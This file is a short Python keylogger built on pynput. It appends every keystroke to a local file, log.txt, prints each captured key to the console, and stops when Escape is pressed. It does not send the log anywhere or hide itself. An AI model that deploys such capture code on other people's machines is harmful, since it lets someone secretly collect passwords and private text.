import pynput
from pynput.keyboard import Key, Listener

# File to log the keys
log_file = "log.txt"

def write_to_file(key):
    with open(log_file, "a") as file:
        key_data = str(key).replace("'", "")
        if key == Key.space:
            file.write(' ')
        elif key == Key.enter:
            file.write('\n')
        elif key == Key.backspace:
            file.write("[BACKSPACE]")
        elif key == Key.tab:
            file.write("[TAB]")
        elif key == Key.esc:
            file.write("[ESC]")
        else:
            file.write(key_data)

def on_press(key):
    write_to_file(key)
    print('Wrote', key, 'to', log_file, '.')

def on_release(key):
    if key == Key.esc:
        print('Escape pressed. Script stopping...')
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
